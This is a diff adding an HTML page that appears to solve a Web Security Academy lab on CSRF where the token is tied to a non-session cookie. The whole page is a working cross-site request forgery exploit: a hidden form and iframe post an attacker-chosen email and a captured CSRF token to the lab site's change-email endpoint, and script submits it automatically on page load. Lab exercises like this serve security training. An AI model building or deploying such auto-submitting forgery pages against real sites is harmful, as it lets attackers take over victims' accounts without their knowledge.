@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab: CSRF where token is tied to non-session cookie</title>
+</head>
+<body>
+    
+    <iframe style="display:none" name="csrf-iframe"></iframe>
+    <form action="https://0a3400810361e7f58101d59a002800a1.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
+        <input type="hidden" name="email" value="evil3@test.com">
+        <input type="hidden" name="csrf" value="F6KSiq4eRkntl6d4L8dDsS6ayF9VBvAp">
+    </form>
+    <script>
+        document.getElementById("csrf-form").submit();
+    </script>
+</body>
+</html>
